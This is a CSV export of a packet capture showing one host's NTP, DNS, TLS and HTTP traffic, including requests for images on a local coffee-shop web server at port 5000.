"No.","Time","Source","Destination","Protocol","Length","Info","src_mac"
"51","2023-10-21 13:47:50.278860362","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"73","2023-10-21 13:47:52.205410344","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1 Ack=1 Win=501 Len=110 TSval=2919158974 TSecr=1841245560 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"76","2023-10-21 13:47:52.208549787","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=111 Ack=111 Win=501 Len=0 TSval=2919158978 TSecr=1841250576","VMware_65:77:ad"
"78","2023-10-21 13:47:52.208973689","192.168.1.227","192.168.1.1","TCP","66","[TCP Dup ACK 76#1] 42434  >  8009 [ACK] Seq=111 Ack=111 Win=501 Len=0 TSval=2919158978 TSecr=1841250576","VMware_65:77:ad"
"222","2023-10-21 13:47:57.212778198","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=111 Ack=111 Win=501 Len=110 TSval=2919163982 TSecr=1841250576 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"224","2023-10-21 13:47:57.218903730","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=221 Ack=221 Win=501 Len=0 TSval=2919163988 TSecr=1841255583","VMware_65:77:ad"
"318","2023-10-21 13:48:02.223156428","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=221 Ack=221 Win=501 Len=110 TSval=2919168990 TSecr=1841255583 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"320","2023-10-21 13:48:02.226410922","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=331 Ack=331 Win=501 Len=0 TSval=2919168995 TSecr=1841260593","VMware_65:77:ad"
"510","2023-10-21 13:48:07.229317688","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=331 Ack=331 Win=501 Len=110 TSval=2919173998 TSecr=1841260593 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"512","2023-10-21 13:48:07.231686519","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=441 Ack=441 Win=501 Len=0 TSval=2919174001 TSecr=1841265599","VMware_65:77:ad"
"717","2023-10-21 13:48:12.239023845","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=441 Ack=441 Win=501 Len=110 TSval=2919179008 TSecr=1841265599 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"719","2023-10-21 13:48:12.260518289","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=551 Ack=551 Win=501 Len=0 TSval=2919179028 TSecr=1841270608","VMware_65:77:ad"
"924","2023-10-21 13:48:17.273019689","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=551 Ack=551 Win=501 Len=110 TSval=2919184039 TSecr=1841270608 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"926","2023-10-21 13:48:17.283623104","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=661 Ack=661 Win=501 Len=0 TSval=2919184052 TSecr=1841275650","VMware_65:77:ad"
"1036","2023-10-21 13:48:22.284580754","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=661 Ack=661 Win=501 Len=110 TSval=2919189053 TSecr=1841275650 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1038","2023-10-21 13:48:22.286826625","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=771 Ack=771 Win=501 Len=0 TSval=2919189056 TSecr=1841280654","VMware_65:77:ad"
"1050","2023-10-21 13:48:22.475488807","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"1052","2023-10-21 13:48:22.565056815","192.168.1.227","192.168.1.183","TCP","74","52686  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341538638 TSecr=0 WS=128","VMware_65:77:ad"
"1056","2023-10-21 13:48:22.566663823","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341538641 TSecr=1741518850","VMware_65:77:ad"
"1057","2023-10-21 13:48:22.571054322","192.168.1.227","192.168.1.183","HTTP","499","GET / HTTP/1.1 ","VMware_65:77:ad"
"1062","2023-10-21 13:48:22.706840036","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [ACK] Seq=434 Ack=176 Win=64128 Len=0 TSval=2341538781 TSecr=1741518990","VMware_65:77:ad"
"1065","2023-10-21 13:48:22.707123048","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [ACK] Seq=434 Ack=5968 Win=61568 Len=0 TSval=2341538781 TSecr=1741518991","VMware_65:77:ad"
"1067","2023-10-21 13:48:22.707403512","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [ACK] Seq=434 Ack=7347 Win=60544 Len=0 TSval=2341538781 TSecr=1741518991","VMware_65:77:ad"
"1068","2023-10-21 13:48:22.715584944","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [FIN, ACK] Seq=434 Ack=7348 Win=64128 Len=0 TSval=2341538789 TSecr=1741518992","VMware_65:77:ad"
"1089","2023-10-21 13:48:23.452281989","192.168.1.227","192.168.1.254","DNS","80","Standard query 0xf0a9 A fonts.googleapis.com","VMware_65:77:ad"
"1090","2023-10-21 13:48:23.452282360","192.168.1.227","192.168.1.254","DNS","80","Standard query 0x8da8 AAAA fonts.googleapis.com","VMware_65:77:ad"
"1091","2023-10-21 13:48:23.452559019","192.168.1.227","192.168.1.254","DNS","77","Standard query 0xa378 A www.w3schools.com","VMware_65:77:ad"
"1092","2023-10-21 13:48:23.452610628","192.168.1.227","192.168.1.254","DNS","77","Standard query 0x0977 AAAA www.w3schools.com","VMware_65:77:ad"
"1096","2023-10-21 13:48:23.483322960","192.168.1.227","74.125.200.95","TCP","74","53016  >  443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2027201309 TSecr=0 WS=128","VMware_65:77:ad"
"1098","2023-10-21 13:48:23.486984523","192.168.1.227","74.125.200.95","TCP","66","53016  >  443 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2027201313 TSecr=3154215697","VMware_65:77:ad"
"1099","2023-10-21 13:48:23.499246090","192.168.1.227","192.168.1.183","TCP","74","52692  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341539573 TSecr=0 WS=128","VMware_65:77:ad"
"1101","2023-10-21 13:48:23.499973570","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341539574 TSecr=1741519784","VMware_65:77:ad"
"1102","2023-10-21 13:48:23.500843677","192.168.1.227","192.168.1.183","HTTP","463","GET /static/images/coffeeshop.jpg HTTP/1.1 ","VMware_65:77:ad"
"1104","2023-10-21 13:48:23.502148739","192.168.1.227","192.168.1.183","TCP","74","52708  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341539576 TSecr=0 WS=128","VMware_65:77:ad"
"1106","2023-10-21 13:48:23.502580116","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341539576 TSecr=1741519786","VMware_65:77:ad"
"1107","2023-10-21 13:48:23.503048092","192.168.1.227","192.168.1.183","HTTP","465","GET /static/images/coffeehouse2.jpg HTTP/1.1 ","VMware_65:77:ad"
"1109","2023-10-21 13:48:23.511424772","192.168.1.227","192.168.1.183","TCP","74","52714  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341539585 TSecr=0 WS=128","VMware_65:77:ad"
"1111","2023-10-21 13:48:23.511951234","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341539586 TSecr=1741519796","VMware_65:77:ad"
"1112","2023-10-21 13:48:23.515444975","192.168.1.227","192.168.1.183","HTTP","456","GET /static/images/map.jpg HTTP/1.1 ","VMware_65:77:ad"
"1118","2023-10-21 13:48:23.536815563","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=371 Win=64128 Len=0 TSval=2341539610 TSecr=1741519820","VMware_65:77:ad"
"1119","2023-10-21 13:48:23.536947997","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=369 Win=64128 Len=0 TSval=2341539611 TSecr=1741519820","VMware_65:77:ad"
"1120","2023-10-21 13:48:23.536948027","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=364 Win=64128 Len=0 TSval=2341539611 TSecr=1741519821","VMware_65:77:ad"
"1128","2023-10-21 13:48:23.537693707","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=7609 Win=60672 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1130","2023-10-21 13:48:23.537693817","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=7604 Win=60672 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1132","2023-10-21 13:48:23.537693837","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=13396 Win=56704 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1135","2023-10-21 13:48:23.538218007","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=16292 Win=54656 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1136","2023-10-21 13:48:23.538218108","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=7611 Win=60672 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1137","2023-10-21 13:48:23.538218128","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=13401 Win=61568 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1138","2023-10-21 13:48:23.538218148","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=8563 Win=64128 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1139","2023-10-21 13:48:23.538218178","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=14355 Win=60544 Len=0 TSval=2341539612 TSecr=1741519822","VMware_65:77:ad"
"1140","2023-10-21 13:48:23.538218198","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=16753 Win=62592 Len=0 TSval=2341539612 TSecr=1741519822","VMware_65:77:ad"
"1142","2023-10-21 13:48:23.538479096","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=23993 Win=71168 Len=0 TSval=2341539612 TSecr=1741519822","VMware_65:77:ad"
"1147","2023-10-21 13:48:23.538884875","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=27876 Win=46848 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1148","2023-10-21 13:48:23.538884955","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=42356 Win=37120 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1149","2023-10-21 13:48:23.538956943","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=24491 Win=58752 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1151","2023-10-21 13:48:23.539246331","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=31046 Win=53760 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1154","2023-10-21 13:48:23.539603802","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=48148 Win=61568 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1157","2023-10-21 13:48:23.539780440","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=24945 Win=74112 Len=0 TSval=2341539613 TSecr=1741519823","VMware_65:77:ad"
"1158","2023-10-21 13:48:23.540102690","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=32185 Win=71168 Len=0 TSval=2341539614 TSecr=1741519823","VMware_65:77:ad"
"1159","2023-10-21 13:48:23.540102790","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=69868 Win=51072 Len=0 TSval=2341539614 TSecr=1741519823","VMware_65:77:ad"
"1164","2023-10-21 13:48:23.540102820","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=40873 Win=65280 Len=0 TSval=2341539614 TSecr=1741519823","VMware_65:77:ad"
"1165","2023-10-21 13:48:23.540102841","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=48113 Win=60416 Len=0 TSval=2341539614 TSecr=1741519824","VMware_65:77:ad"
"1166","2023-10-21 13:48:23.540517443","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=80004 Win=84480 Len=0 TSval=2341539614 TSecr=1741519824","VMware_65:77:ad"
"1168","2023-10-21 13:48:23.540517543","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=109716 Win=143872 Len=0 TSval=2341539614 TSecr=1741519824","VMware_65:77:ad"
"1172","2023-10-21 13:48:23.541433830","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=49521 Win=75008 Len=0 TSval=2341539614 TSecr=1741519824","VMware_65:77:ad"
"1173","2023-10-21 13:48:23.541433900","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=111860 Win=148096 Len=0 TSval=2341539615 TSecr=1741519824","VMware_65:77:ad"
"1174","2023-10-21 13:48:23.541433930","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [FIN, ACK] Seq=400 Ack=31046 Win=64128 Len=0 TSval=2341539615 TSecr=1741519822","VMware_65:77:ad"
"1176","2023-10-21 13:48:23.541433950","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=142268 Win=208896 Len=0 TSval=2341539615 TSecr=1741519825","VMware_65:77:ad"
"1177","2023-10-21 13:48:23.541433970","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=143716 Win=211840 Len=0 TSval=2341539615 TSecr=1741519825","VMware_65:77:ad"
"1178","2023-10-21 13:48:23.541434001","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=169780 Win=263936 Len=0 TSval=2341539615 TSecr=1741519825","VMware_65:77:ad"
"1179","2023-10-21 13:48:23.542940793","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [FIN, ACK] Seq=398 Ack=50157 Win=75008 Len=0 TSval=2341539617 TSecr=1741519824","VMware_65:77:ad"
"1182","2023-10-21 13:48:23.555631148","192.168.1.227","192.229.179.87","TCP","74","36704  >  443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=3909217046 TSecr=0 WS=128","VMware_65:77:ad"
"1183","2023-10-21 13:48:23.555631559","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [FIN, ACK] Seq=391 Ack=170980 Win=266880 Len=0 TSval=2341539630 TSecr=1741519825","VMware_65:77:ad"
"1186","2023-10-21 13:48:23.558509865","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=3909217049 TSecr=1197392397","VMware_65:77:ad"
"1189","2023-10-21 13:48:23.822341097","192.168.1.227","74.125.200.95","TLSv1.3","1134","Client Hello","VMware_65:77:ad"
"1190","2023-10-21 13:48:23.823409193","192.168.1.227","192.229.179.87","TLSv1.3","1043","Client Hello","VMware_65:77:ad"
"1194","2023-10-21 13:48:23.825983861","192.168.1.227","74.125.200.95","TCP","66","53016  >  443 [ACK] Seq=1069 Ack=197 Win=64128 Len=0 TSval=2027201652 TSecr=3154216037","VMware_65:77:ad"
"1196","2023-10-21 13:48:23.827107146","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=978 Ack=4004 Win=62592 Len=0 TSval=3909217318 TSecr=1197392666","VMware_65:77:ad"
"1197","2023-10-21 13:48:23.834033989","192.168.1.227","74.125.200.95","TLSv1.3","156","Application Data","VMware_65:77:ad"
"1199","2023-10-21 13:48:23.839446634","192.168.1.227","74.125.200.95","TLSv1.3","128","Application Data","VMware_65:77:ad"
"1200","2023-10-21 13:48:23.839522560","192.168.1.227","74.125.200.95","TLSv1.3","137","Application Data","VMware_65:77:ad"
"1201","2023-10-21 13:48:23.839730703","192.168.1.227","74.125.200.95","TLSv1.3","117","Application Data","VMware_65:77:ad"
"1202","2023-10-21 13:48:23.841857583","192.168.1.227","74.125.200.95","TLSv1.3","113","Application Data","VMware_65:77:ad"
"1206","2023-10-21 13:48:23.846405492","192.168.1.227","74.125.200.95","TLSv1.3","431","Application Data","VMware_65:77:ad"
"1212","2023-10-21 13:48:23.853721970","192.168.1.227","74.125.200.95","TCP","66","53016  >  443 [ACK] Seq=1755 Ack=2363 Win=62720 Len=0 TSval=2027201679 TSecr=3154216064","VMware_65:77:ad"
"1213","2023-10-21 13:48:23.859811713","192.168.1.227","74.125.200.95","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1215","2023-10-21 13:48:23.869498456","192.168.1.227","192.229.179.87","TLSv1.3","156","Application Data","VMware_65:77:ad"
"1216","2023-10-21 13:48:23.870230037","192.168.1.227","192.229.179.87","TLSv1.3","128","Application Data","VMware_65:77:ad"
"1217","2023-10-21 13:48:23.870414415","192.168.1.227","192.229.179.87","TLSv1.3","137","Application Data","VMware_65:77:ad"
"1218","2023-10-21 13:48:23.870936450","192.168.1.227","192.229.179.87","TLSv1.3","117","Application Data","VMware_65:77:ad"
"1219","2023-10-21 13:48:23.870989652","192.168.1.227","192.229.179.87","TLSv1.3","424","Application Data","VMware_65:77:ad"
"1226","2023-10-21 13:48:23.874460259","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=4259 Win=64128 Len=0 TSval=3909217365 TSecr=1197392710","VMware_65:77:ad"
"1227","2023-10-21 13:48:23.874507189","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=4514 Win=64000 Len=0 TSval=3909217365 TSecr=1197392711","VMware_65:77:ad"
"1228","2023-10-21 13:48:23.874507239","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=4610 Win=64000 Len=0 TSval=3909217365 TSecr=1197392711","VMware_65:77:ad"
"1229","2023-10-21 13:48:23.874549820","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=4641 Win=64000 Len=0 TSval=3909217366 TSecr=1197392711","VMware_65:77:ad"
"1232","2023-10-21 13:48:23.874904927","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=8985 Win=61568 Len=0 TSval=3909217366 TSecr=1197392713","VMware_65:77:ad"
"1233","2023-10-21 13:48:23.874904977","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=10284 Win=60416 Len=0 TSval=3909217366 TSecr=1197392713","VMware_65:77:ad"
"1234","2023-10-21 13:48:23.875430343","192.168.1.227","192.229.179.87","TLSv1.3","113","Application Data","VMware_65:77:ad"
"1237","2023-10-21 13:48:24.082918465","192.168.1.227","192.168.1.183","TCP","74","52720  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341540156 TSecr=0 WS=128","VMware_65:77:ad"
"1239","2023-10-21 13:48:24.083670709","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341540158 TSecr=1741520367","VMware_65:77:ad"
"1240","2023-10-21 13:48:24.084080470","192.168.1.227","192.168.1.183","HTTP","464","GET /static/images/coffeehouse.jpg HTTP/1.1 ","VMware_65:77:ad"
"1244","2023-10-21 13:48:24.086469880","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=370 Win=64128 Len=0 TSval=2341540160 TSecr=1741520370","VMware_65:77:ad"
"1246","2023-10-21 13:48:24.086616931","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=7610 Win=60672 Len=0 TSval=2341540160 TSecr=1741520371","VMware_65:77:ad"
"1247","2023-10-21 13:48:24.086662609","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=8562 Win=59776 Len=0 TSval=2341540161 TSecr=1741520371","VMware_65:77:ad"
"1249","2023-10-21 13:48:24.087157954","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=16754 Win=53632 Len=0 TSval=2341540161 TSecr=1741520371","VMware_65:77:ad"
"1252","2023-10-21 13:48:24.087564767","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=24946 Win=59648 Len=0 TSval=2341540161 TSecr=1741520371","VMware_65:77:ad"
"1255","2023-10-21 13:48:24.087804115","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=32186 Win=60672 Len=0 TSval=2341540162 TSecr=1741520371","VMware_65:77:ad"
"1256","2023-10-21 13:48:24.087804185","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=33138 Win=59776 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
